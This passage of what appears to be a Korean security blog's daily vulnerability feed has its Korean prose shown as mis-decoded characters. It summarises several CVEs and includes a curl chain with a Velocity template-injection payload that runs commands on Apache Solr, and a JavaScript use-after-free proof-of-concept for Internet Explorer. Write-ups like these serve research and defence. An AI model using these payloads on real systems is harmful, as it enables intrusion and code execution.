í•©ë‹ˆë‹¤. </p> <pre><code class="hljs jsx">curl -X POST --header <span class="hljs-string">&quot;Content-Type:application/octet-stream&quot;</span>--data-binary@<span class="hljs-number">7.</span>zip <span class="hljs-string">&quot;http://[host]/solr/admin/configs?action=UPLOAD&amp;name=file1&quot;</span></code></pre></li><li><p>CREATEëŠ” ê¸°ì¡´ configsetì„ ê¸°ë°˜ìœ¼ë¡œ ìƒˆë¡œìš´ configsetì„ ì‘ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ì´ìš©í•´ UPLOADëœ configsetì„ ê¸°ë°˜ìœ¼ë¡œ ìƒˆë¡œìš´ configsetì„ ë§Œë“¤ë©´ ì•…ìš© ê°€ëŠ¥í•œ ê¸°ëŠ¥ë“¤ì„ í•„í„°ë§ì„ í•˜ì§€ ì•Šì•„ ì¸ì¦ ê²€ì‚¬ ë¡œì§ì„ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p> <pre><code class="hljs jsx">curl <span class="hljs-string">&quot;http://[host]/solr/admin/configs?action=CREATE&amp;name=file3&amp;baseConfigSet=file1&amp;configSetProp.immutable=false&amp;wt=xml&amp;omitHeader=true&quot;</span></code></pre></li><li><p>2ì—ì„œ ì–»ì€ ìƒˆë¡œìš´ configsetë¥¼ ê¸°ë°˜ìœ¼ë¡œ ì•…ì„± ì»¬ë ‰ì…˜ì„ ìƒì„±í•©ë‹ˆë‹¤.</p> <pre><code class="hljs jsx">curl <span class="hljs-string">&quot;http://[host]/solr/admin/collections?action=CREATE&amp;numShards=1&amp;name=file2&amp;collection.configName=file3&quot;</span></code></pre></li><li><p>ìƒì„±ëœ ì•…ì„± ì»¬ë ‰ì…˜ì€ ì›ê²© ì½”ë“œ ì‹¤í–‰ì— ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p> <pre><code class="hljs jsx">http:<span class="hljs-comment">//[host]/solr/newCollection3/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=&#x27;&#x27;)+%23set($rt=$x.class.forName(&#x27;java.lang.Runtime&#x27;))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end&quot;</span></code></pre></li></ol><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.secpulse.com/archives/144081.html">https://www.secpulse.com/archives/144081.html</a></p><p><a href="https://issues.apache.org/jira/browse/SOLR-14925">https://issues.apache.org/jira/browse/SOLR-14925</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>apache solr</tag>
      
      <tag>unauthrization upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-17053: Internet Explorer UAF ì·¨ì•½ì </title>
    <link href="/2020/11/19/idioth/2020-11-19/"/>
    <url>/2020/11/19/idioth/2020-11-19/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.trendmicro.com/en_us/research/20/k/cve-2020-17053-use-after-free-ie-vulnerability.html">CVE-2020-17053: Use-After-Free IE Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Internet Explorer</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Internet Explorerì—ì„œ neutering ArrayBufferë¡œ ì¸í•œ use after free ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì€ CVE-2020-1380ê³¼ ë¹„ìŠ·í•œ ì·¨ì•½ì ì´ì§€ë§Œ JIT ì—”ì§„ ì—†ì´ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>JIT ì—”ì§„ì„ ì‚¬ìš©í•˜ì§€ ì•Šê³  itemì„ TypedArrayë¡œ ë³€í™˜í•  ë•Œ <em>jscript.dll</em>ì€ interpreterì—ì„œ ë‹¤ìŒê³¼ ê°™ì€ ì‘ì—…ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤.</p><ol><li><code>Js::JavascriptConversion::ToNumber()</code> í˜¸ì¶œ</li><li>TypedArrayì˜ ArrayBufferê°€ detach ë˜ì—ˆëŠ”ì§€ í™•ì¸</li><li>ë³€í™˜í•  elementì˜ indexì™€ TypedArrayì˜ ê¸¸ì´ ë¹„êµ</li><li><code>Js::JavascriptConversion::ToNumber()</code>ë¥¼ ë‹¤ì‹œ í˜¸ì¶œí•˜ì—¬ ArrayBufferë¡œ ê°’ ì„¤ì •</li></ol><p><code>Js::JavascriptConversion::ToNumber()</code>ì˜ ì²« ë²ˆì§¸ í˜¸ì¶œì—ì„œ í•´ì»¤ëŠ” callback í•¨ìˆ˜ë¥¼ í†µí•´ TypedArrayì˜ ArrayBufferë¥¼ free í•  ìˆ˜ ìˆê³  uafë¥¼ ë°œìƒì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ê²ƒì„ ë§‰ê¸° ìœ„í•´ ì²« ë²ˆì§¸ í˜¸ì¶œ í›„ ArrayBufferê°€ detach ë˜ì—ˆëŠ”ì§€ í™•ì¸í•˜ì—¬ user code callbackì—ì„œ ë©”ëª¨ë¦¬ê°€ free ë˜ëŠ” ê²ƒì„ ë°©ì§€í•©ë‹ˆë‹¤. í•˜ì§€ë§Œ ë‘ ë²ˆì§¸ í˜¸ì¶œì—ì„œëŠ” ë³„ë‹¤ë¥¸ ê²€ì‚¬ë¥¼ í•˜ì§€ ì•Šê¸° ë•Œë¬¸ì— ì´ë¥¼ ì•…ìš©í•˜ì—¬ uafë¥¼ ë°œìƒì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><details><summary>POC Code</summary><p><pre><code class="hljs js"><span class="hljs-keyword">var</span> arr = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float32Array</span>(<span class="hljs-number">0x100</span>);<span class="hljs-keyword">var</span> flag = <span class="hljs-number">0</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">index, value</span>) </span>&#123;    arr[index] = value;&#125;<span class="hljs-keyword">var</span> obj = &#123;&#125;;obj.valueOf = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">if</span>(flag == <span class="hljs-number">1</span>) &#123;        worker = <span class="hljs-keyword">new</span> Worker(<span class="hljs-string">&quot;&quot;</span>);        worker.onmessage = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;&#125;;        worker.postMessage(<span class="hljs-number">0</span>, [arr.buffer]);        worker.terminate();        worker = <span class="hljs-literal">null</span>;        <span class="hljs-keyword">var</span> start = <span class="hljs-built_in">Date</span>.now();        <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Date</span>.now() - start &lt; <span class="hljs-number">200</span>) &#123;&#125;        <span class="hljs-keyword">return</span> <span class="hljs-number">0x1337</span>;    &#125;    flag = <span class="hljs-number">1</span>;&#125;;pwn(<span class="hljs-number">0</span>, obj);</code></pre></p></details><p>ë‘ ë²ˆì§¸ ì¸ìë¥¼ <code>obj</code>ë¡œ <code>pwn</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ë©´ itemì„ TypedArrayë¡œ ë³€í™˜í•  ë•Œ <code>Js::JavascriptConversion::ToNumber()</code>ê°€ í˜¸ì¶œë˜ì–´ callback í•¨ìˆ˜ê°€ ë‘ ë²ˆ í˜¸ì¶œë©ë‹ˆë‹¤. ì²« ë²ˆì§¸ í˜¸ì¶œì—ëŠ” <code>flag == 0</code>ì´ë¯€ë¡œ ArrayBufferê°€ neutering ë˜ì§€ ì•Šì§€ë§Œ ë‘ ë²ˆì§¸ í˜¸ì¶œì—ì„œ ArrayBufferê°€ neutering ë©ë‹ˆë‹¤. ë‘ ë²ˆì§¸ í˜¸ì¶œì—ì„œëŠ” ArrayBufferê°€ detach ë˜ì—ˆëŠ”ì§€ ê²€ì‚¬í•˜ì§€ ì•Šìœ¼ë¯€ë¡œ uafê°€ ë°œìƒí•©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>use after free</tag>
      
      <tag>idioth</tag>
      
      <tag>internet explorer</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-15647: website stealing files from device</title>
    <link href="/2020/11/18/fabu1ous/2020-11-18/"/>
    <url>/2020/11/18/fabu1ous/2020-11-18/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/@kanytu/firefox-and-how-a-website-could-steal-all-of-your-cookies-581fe4648e8d">Firefox: How a website could steal all your cookies</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Firefox Fennec v68.9.0</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Firefox Fennecì—ì„œ Arbitrary local file access ì·¨ì•½ì (CVE-2020â€“15647)ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. ì´ë¥¼ ì•…ìš©í•œ í•´ì»¤ì˜ ì›¹ ì‚¬ì´íŠ¸ì— ì ‘ì†í•˜ë©´ í•¸ë“œí°ì˜ íŒŒì¼ì„ íƒˆì·¨ë‹¹í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì•ˆë“œë¡œì´ë“œìš© <code>Firefox Content Provider</code>ì˜ misconfigureë¡œ ì¸í•´ ë°œìƒí•˜ëŠ” ì·¨ì•½ì ìœ¼ë¡œ Firefoxì—ì„œ ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ëª¨ë“  íŒŒì¼ì„ ì›¹í˜ì´ì§€ê°€ ì½ì„ ìˆ˜ ìˆê³  í•´ì»¤ì˜ ì›¹ ì„œë²„ë¡œ ë‚´ìš©ì„ ì „ì†¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì·¨ì•½ì ì´ ë°œìƒí•˜ëŠ” ì´ìœ ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li><code>content://</code> URIë¡œ íŒŒì¼ì„ ì—´ë©´ íŒŒì¼ëª…ì„ ë°”ê¾¸ì§€ ì•Šê³  cache í•œ ë’¤ ê·¸ê³³ìœ¼ë¡œ redirect í•©ë‹ˆë‹¤.</li><li><a href="https://developer.android.com/training/secure-file-sharing/setup-sharing">file content provider</a>ì˜ ê³µìœ  ê°€ëŠ¥ ë””ë ‰í„°ë¦¬ê°€ root-pathë¡œ ì„¤ì •ë¼ìˆìŠµë‹ˆë‹¤.</li></ol><p>ë¸Œë¼ìš°ì €ëŠ” ë¡œì»¬ html íŒŒì¼ì„ ì—´ ë•Œ <code>content://</code> URIë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. victim deviceì—ì„œ íƒˆì·¨í•˜ê³ ì í•˜ëŠ” íŒŒì¼(ì´í•˜ target)ê³¼ ë™ì¼í•œ ì´ë¦„ì˜ ì•…ì„± html íŒŒì¼ì„ ì—…ë¡œë“œí•˜ê³  ì‹¤í–‰í•˜ë©´ Firefoxê°€ íŒŒì¼ëª…ì„ ìœ ì§€í•œ ì±„ë¡œ cache í•©ë‹ˆë‹¤. ì•…ì„± html íŒŒì¼ì€ ë¸Œë¼ìš°ì €ê°€ targetì„ <code>content://</code>ë¡œ ì—´ê²Œ í•˜ê³  ê¸°ì¡´ì— cache ëœ íŒŒì¼ì´ targetì˜ ë‚´ìš©ìœ¼ë¡œ overwrite ë©ë‹ˆë‹¤. ì•…ì„± htmlì´ ì´ë¥¼ íŒŒì‹±í•´ í•´ì»¤ì˜ ì›¹ ì„œë²„ë¡œ ì „ì†¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>android</tag>
      
      <tag>firefox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Samsung Neural Processing Unit memory corruption in shared memory parsing</title>
    <link href="/2020/11/17/l0ch/2020-11-17/"/>
    <url>/2020/11/17/l0ch/2020-11-17/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2073">Samsung NPU (Neural Processing Unit) memory corruption in shared memory parsing</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Samsungâ€™s Exynos-based devices (including Neural Processing Unit)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ì‚¼ì„±ì˜ ì—‘ì‹œë…¸ìŠ¤ ëª¨ë°”ì¼ í”„ë¡œì„¸ì„œì— í¬í•¨ëœ NPU(Neural Processing Unit)ëŠ” ë¨¸ì‹ ëŸ¬ë‹ ì—°ì‚°ì— ì‚¬ìš©ë©ë‹ˆë‹¤. ì´ëŸ¬í•œ NPUì˜ Neural Network Feature Mapsë¥¼ íŒ¨í‚¤ì§•í•˜ëŠ”ë° ì‚¬ìš©ë˜ëŠ” <code>NCP</code> êµ¬ì¡°ì²´ì˜ ì…ë ¥ ê°’ ê²€ì¦ì„ í•˜ì§€ ì•Šì•„ memory corruptionì´ ë°œìƒí•˜ëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>Convolution Neural Network Feature Maps(IFM / OFM)ì„ íŒ¨í‚¤ì§•í•˜ëŠ” <code>npu_session_s_graph</code> ì—ì„œëŠ” ë¨¼ì €<code>__get_session_info</code> ë¥¼ í˜¸ì¶œí•´ ì‚¬ìš©ì ì˜ì—­ ION ë©”ëª¨ë¦¬ ë²„í¼ë¥¼ ì»¤ë„ ë©”ëª¨ë¦¬ì— ë§¤í•‘í•©ë‹ˆë‹¤.</p><blockquote><p>ION - process ê°„ ë©”ëª¨ë¦¬ ê³µìœ ë¥¼ ìœ„í•œ ë©”ëª¨ë¦¬ í• ë‹¹ì</p></blockquote><p>ê·¸ë¦¬ê³  <code>__config_sesison_info</code>ë¥¼ í˜¸ì¶œí•´ ë§¤í•‘ëœ ë©”ëª¨ë¦¬ë¥¼ íŒŒì‹±í•˜ëŠ”ë°, ì•„ë˜ì™€ ê°™ì€ ê³¼ì •ì—ì„œ ì·¨ì•½ì ì„ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><ol><li><code>__pilot_parsing_ncp</code> ì—ì„œ <code>temp_IFM_av</code> ë²„í¼ì˜ í¬ê¸°ëŠ” ì‚¬ìš©ì ì˜ì—­ ê³µìœ  ë©”ëª¨ë¦¬ì—ì„œ ê°€ì ¸ì˜¨  <code>ncp-&gt; memory_vector_cnt</code> ì„ ì‚¬ìš©í•´ ë¨¼ì € ê³„ì‚°ë©ë‹ˆë‹¤.</li><li>TOCTOU ë²„ê·¸ë¥¼ íŠ¸ë¦¬ê±°í•´ ì‚¬ìš©ì ì˜ì—­ì—ì„œ <code>ncp-&gt; memory_vector_cnt</code> ì˜ ê°’ì„ ë” í° ê°’ìœ¼ë¡œ ë³€ê²½í•©ë‹ˆë‹¤.</li><li>ì´í›„ <code>__second_parsing_ncp</code> ì—ì„œ <code>ncp-&gt; memory_vector_cnt</code> ë¥¼ ë‹¤ì‹œ ì½ì–´ <code>temp_IFM_av</code> ë²„í¼ì— ë³µì‚¬í•©ë‹ˆë‹¤.</li><li>2ë‹¨ê³„ì—ì„œ í° ê°’ìœ¼ë¡œ ë³€ê²½ëœ <code>ncp-&gt; memory_vector_cnt</code> ë¡œ ì¸í•´ <code>temp_IFM_av</code> ë²„í¼ì˜ ì‚¬ì´ì¦ˆë³´ë‹¤ ë” ë§ì€ ê°’ì„ ë³µì‚¬í•˜ê²Œ ë˜ê³  ì´ë•Œ bounds checkë¥¼ í•˜ì§€ ì•Šì•„ heap buffer overflowê°€ ë°œìƒí•©ë‹ˆë‹¤.</li></ol><p>í•´ë‹¹ ì·¨ì•½ì ì„ ì´ìš©í•˜ë©´ ì»¤ë„ ìŠ¤ë ˆë“œ ìŠ¤íƒì„ í¬í•¨í•´ vmapì˜ ì»¤ë„ ë²„í¼ ë²”ìœ„ë¥¼ ë²—ì–´ë‚˜ ë°ì´í„°ë¥¼ ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>toctou</tag>
      
      <tag>samsung</tag>
      
      <tag>L0ch</tag>
      
      <tag>npu</tag>
      
      <tag>neural processing unit</tag>
      
      <tag>heap buffer overflow</tag>
      
      <tag>exynos</tag>
      
      <tag>shared memory</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Two Privilege Escalation Vulnerability in Ivanti Unified Endpoint Manager</title>
    <link href="/2020/11/16/idioth/2020-11-16/"/>
    <url>/2020/11/16/idioth/2020-11-16/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.jumpsec.com/detecting-known-dll-hijacking-and-named-pipe-token-impersonation-attacks-with-sysmon/">Detecting known DLL hijacking and named pipe token impersonation attacks with Sysmon</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Ivanti Unified Endpoint Manager &lt;= 2020.1.1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p><strong>CVE-2020-13770: Named pipe token impersonation</strong></p><p>í•´ë‹¹ ì·¨ì•½ì ì€ í”„ë¡œì„¸ìŠ¤ê°€ named pipe objectë¥¼ ì—´ ë•Œ ë³´ì•ˆ attributeê°€ ë¶€ì ì ˆí•˜ì—¬ ë°œìƒí•œ ì·¨ì•½ì ì…ë‹ˆë‹¤. </p><p><code>CreateFile</code>ì˜ <code>dwFlagsAndAttributes</code> ì¸ìê°€ ì•„ë˜ì™€ ê°™ì€ attributeì¼ ë•Œ ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤.</p><ul><li>SECURITY_DELEGATION</li><li>SECURITY_IMPERSONATION</li></ul><p>ìœ„ì˜ ë‘ attribute ì¤‘ í•˜ë‚˜ë¡œ named pipeë¥¼ ì—´ë©´ ì„œë²„ëŠ” í´ë¼ì´ì–¸íŠ¸ í† í°ì„ ì–»ê³  ì¶”í›„ access checkì— ì‚¬ìš©í•©ë‹ˆë‹¤. pipe ì„œë²„ëŠ” pipe í´ë¼ì´ì–¸íŠ¸ì˜ ê¶Œí•œ, security context ë“±ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ ì„œë²„ë³´ë‹¤ í´ë¼ì´ì–¸íŠ¸ì˜ ê¶Œí•œì´ ë†’ìœ¼ë©´ ì„œë²„ëŠ” ê¶Œí•œ ìƒìŠ¹ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><strong>CVE-2020-13771: DLL search order hijacking</strong></p><p>í•´ë‹¹ ì·¨ì•½ì ì€ ìœˆë„ìš°ì˜ <a href="https://docs.microsoft.com/ko-kr/windows/win32/dlls/dynamic-link-library-search-order">DLL Search Order</a>ë¥¼ ì´ìš©í•œ ì·¨ì•½ì ì…ë‹ˆë‹¤. <code>SafeDllSearchMode</code> ì„¤ì •ì— ê´€ê³„ì—†ì´ í”„ë¡œì„¸ìŠ¤ê°€ DLL íŒŒì¼ì„ ì°¾ì§€ ëª»í•˜ë©´ í™˜ê²½ ë³€ìˆ˜ PATHì—ì„œ íŒŒì¼ì„ ì°¾ìŠµë‹ˆë‹¤. í•´ì»¤ê°€ í™˜ê²½ ë³€ìˆ˜ì— ë“±ë¡ëœ í´ë”ì— ì¡°ì‘ëœ DLL íŒŒì¼ì„ ë°°ì¹˜í•˜ë©´ ì·¨ì•½í•œ í”„ë¡œì„¸ìŠ¤ê°€ í•´ë‹¹ DLLì„ ë¡œë“œí•˜ê³  ê·¸ í”„ë¡œì„¸ìŠ¤ì˜ contextë¡œ <code>DllMain</code>ì´ ì‹¤í–‰ë˜ì–´ ê¶Œí•œìƒìŠ¹ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•´ë‹¹ í”„ë¡œê·¸ë¨ì—ì„œ ì•…ìš©í•  ìˆ˜ ìˆëŠ” dll íŒŒì¼ì€ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p><ul><li>ldprofileui.dll</li><li>wfapi.dll</li><li>DMIAPI32.DLL</li><li>logonsrv.dll</li><li>OOBCredentials.dll</li></ul>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>lpe</tag>
      
      <tag>named pipe</tag>
      
      <tag>dll hijacking</tag>
      
      <tag>idioth</tag>
      
      <tag>dll search order</tag>
      
      <tag>impersonation attack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Windows Patch Diffing ë§›ë³´ê¸° Part 1</title>
    <link href="/2020/11/15/l0ch/windows-patch-diffing-part1/"/>
    <url>/2020/11/15/l0ch/windows-patch-diffing-part1/</url>
    
    <content type="html"><![CDATA[<p>ì•ˆë…•í•˜ì„¸ìš”! L0chì…ë‹ˆë‹¤. ì €ë²ˆ <a href="https://hackyboiz.github.io/2020/11/01/l0ch/cve-2020-1464/">GlueBall ì·¨ì•½ì </a> ê¸€ ì¼ì„ ë•Œ ë””í•‘ í•  ë²„ì „ë³„ ë°”ì´ë„ˆë¦¬ë¥¼ êµ¬í•˜ë‹¤ê°€ ë©˜íƒˆì´ íŒŒì‡„ê¸°ì— ê°ˆë¦° ì¢…ì´ë§ˆëƒ¥ ê°ˆë¦´ ë»”í–ˆì£ ?</p><p>ìƒê°í•´ë³´ë‹ˆê¹Œ ê´œíˆ Diffing í•˜ê² ë‹¤ê³  ê±´ë“œë ¸ë‹¤ê°€ Xê³ ìƒí–ˆëŠ”ë° ì´ëŒ€ë¡œ ê°€ë§Œíˆ ìˆìœ¼ë©´ ì™ ì§€ ì–µìš¸í•˜ìë‚˜ì—¬. ê·¸ë˜ì„œ ì´ ì°¸ì— ì¢€ ì‰½ê²Œ ì‰½ê²Œ ê°ˆ ìˆ˜ ìˆëŠ” ë°©ë²•ì„ ì°¾ëŠë¼ ë°©í™©í•˜ë˜ ì¤‘ ì—„ì²­ë‚œ ê¸€ì„ ë°œê²¬í•˜ê²Œ ë˜ëŠ”ë°..</p><p><a href="https://wumb0.in/extracting-and-diffing-ms-patches-in-2020.html">Extracting and Diffing Windows Patches in 2020</a></p><p>ì´ê±° ì™„ì „ ë‚˜ë¥¼ ìœ„í•œ ê¸€ì´ì–ì•„??ã…</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/1.png"></p><p>ê·¸ë˜ì„œ! ë°”ë¡œ ì •ë¦¬ì— ë“¤ì–´ê°”ì£ . ì•ìœ¼ë¡œ í•  ì‚½ì§ˆì€ ê¿ˆì—ë„ ëª¨ë¥¸ ì±„ ã…‹ã…‹ ì•„</p><h1 id="Diffing-ì´-ë­”ë°"><a href="#Diffing-ì´-ë­”ë°" class="headerlink" title="Diffing ì´ ë­”ë°?"></a>Diffing ì´ ë­”ë°?</h1><p>ê°„ë‹¨í•˜ê²Œ Binary Diffingì´ ë­”ì§€ ì§šê³  ë„˜ì–´ê°€ ë´…ì‹œë‹¤!</p><blockquote><p>Diffing ì€ ì¼ë°˜ì ìœ¼ë¡œ ì»´í“¨í„°ì—ì„œ ë‘ ê°œ íŒŒì¼ì˜ ì°¨ì´ë¥¼ ë³´ì—¬ì£¼ëŠ” ìš©ì–´ë‹¤. (Ex : git diff - Gitì˜ ì†ŒìŠ¤ì½”ë“œ difference í™•ì¸) ë°”ì´ë„ˆë¦¬ ë¶„ì„ ê¸°ë²•(Binary Diffing)ìœ¼ë¡œë„ ì“°ì´ëŠ”ë°, íŒ¨ì¹˜ ë˜ëŠ” ì—…ë°ì´íŠ¸ëœ ë°”ì´ë„ˆë¦¬ì™€ ê¸°ì¡´ ë°”ì´ë„ˆë¦¬ë¥¼ ë¹„êµí•´ì„œ ì–´ë–¤ ì½”ë“œê°€ ë³€ê²½ë˜ì—ˆëŠ”ì§€, ì–´ë–¤ í•¨ìˆ˜ê°€ ì¶”ê°€ë˜ê³  ì œê±°ë˜ì—ˆëŠ”ì§€ ë“± ë²„ì „ ë³„ ë°”ì´ë„ˆë¦¬ì˜ ì°¨ì´ì ì„ ì•Œ ìˆ˜ ìˆëŠ” ë¶„ì„ ê¸°ë²•ì´ë‹¤.</p></blockquote><p>í•œë§ˆë””ë¡œ ì–˜ë„¤ê°€ ë­ë¥¼ ì–´ë–»ê²Œ íŒ¨ì¹˜í–ˆë‚˜~ ë°”ë€ ë¶€ë¶„ë§Œ ì“± ë‘˜ëŸ¬ë³´ëŠ” ë¶„ì„ ê¸°ë²•ì…ë‹ˆë‹¤. ë³„ ê±° ì—†ì–´ ë³´ì´ì§€ë§Œ Diffingì„ í•˜ë©´ì„œ íŒ¨ì¹˜ë¡œ ì¸í•´ ë°œìƒí•œ ìƒˆë¡œìš´ ì·¨ì•½ì ì´ë‚˜, ê¸°ì¡´ ì·¨ì•½ì ì— ëŒ€í•´ ì ìš©í•œ íŒ¨ì¹˜ë¥¼ ìš°íšŒí•˜ëŠ” ìƒˆë¡œìš´ ë°©ë²• ë“±ì„ íš¨ìœ¨ì ìœ¼ë¡œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜¤ëŠ˜ì€ ì•ì„œ ë§í•œ ê²ƒì²˜ëŸ¼ Windows Update íŒ¨ì¹˜ë¥¼ ì¶”ì¶œí•˜ê³  ì¶”ì¶œí•œ ì—…ë°ì´íŠ¸ íŒŒì¼ì„ ì´ìš©í•´ Diffingì„ ì§„í–‰í•´ ë³¼ê²Œìš”.</p><h1 id="Windows-Update-Package"><a href="#Windows-Update-Package" class="headerlink" title="Windows Update Package"></a>Windows Update Package</h1><h2 id="Microsoft-Update-Catalog"><a href="#Microsoft-Update-Catalog" class="headerlink" title="Microsoft Update Catalog"></a>Microsoft Update Catalog</h2><p>ìœˆë„ìš°ëŠ” ì—…ë°ì´íŠ¸ íŒ¨í‚¤ì§€ë¥¼ ë°°í¬í•´ ì‹¤í–‰í•˜ëŠ” ë°©ì‹ìœ¼ë¡œ íŒ¨ì¹˜ë¥¼ í•©ë‹ˆë‹¤.</p><p>Windows 10 ê¸°ì¤€ìœ¼ë¡œ ë²„ì „ ë³„ë¡œ ë‚˜ëˆ„ì–´ ë°°í¬í•˜ê³  ìˆìœ¼ë©° ì˜¤ëŠ˜ì€ ë‹¤ìŒ í™˜ê²½ì—ì„œ ì§„í–‰í•©ë‹ˆë‹¤.</p><pre><code class="hljs markdown">Windows 10 ver1903, 64bit</code></pre><p>ë²„ì „ì— ë”°ë¼ ë°›ì•„ì•¼ í•˜ëŠ” ì—…ë°ì´íŠ¸ íŒŒì¼ì´ ë‹¤ë¥´ë‹ˆ ì°¸ê³ í•˜ì‹œë©´ ë©ë‹ˆë‹¤!</p><p>ê¸°ë³¸ì ìœ¼ë¡œ ìœˆë„ìš°ëŠ” ìë™ ì—…ë°ì´íŠ¸ ë°©ì‹ì„ ì‚¬ìš©í•˜ì§€ë§Œ ìœˆë„ìš° ì¹´íƒˆë¡œê·¸ì—ì„œ ë…ë¦½ ì‹¤í–‰í˜• íŒ¨ì¹˜ íŒ¨í‚¤ì§€ë¥¼ ë°›ì•„ ìˆ˜ë™ ì„¤ì¹˜í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.</p><p>ìœˆë„ìš° ì¹´íƒˆë¡œê·¸ : <a href="https://www.catalog.update.microsoft.com/Home.aspx">https://www.catalog.update.microsoft.com/Home.aspx</a></p><p>Windows ì¹´íƒˆë¡œê·¸ëŠ” ë‹¤ìŒê³¼ ê°™ì€ í˜•ì‹ì˜ ê²€ìƒ‰ ê¸°ëŠ¥ì„ ì œê³µí•©ë‹ˆë‹¤.</p><pre><code class="hljs lisp">YYYY-MM release-number (<span class="hljs-name">x86</span><span class="hljs-name">|x64|</span><span class="hljs-name">ARM64</span>) cumulative</code></pre><p>ì œ ìœˆë„ìš°ëŠ” 1903, 64bit ì´ë¯€ë¡œ 8ì›” ì—…ë°ì´íŠ¸ë¥¼ ì°¾ê¸° ìœ„í•´ ì•„ë˜ í‚¤ì›Œë“œë¡œ ê²€ìƒ‰ì„ í•´ë³¼ê²Œìš”.</p><pre><code class="hljs angelscript"><span class="hljs-number">2020</span><span class="hljs-number">-08</span> <span class="hljs-number">1903</span> x64 cumulative</code></pre><p><img 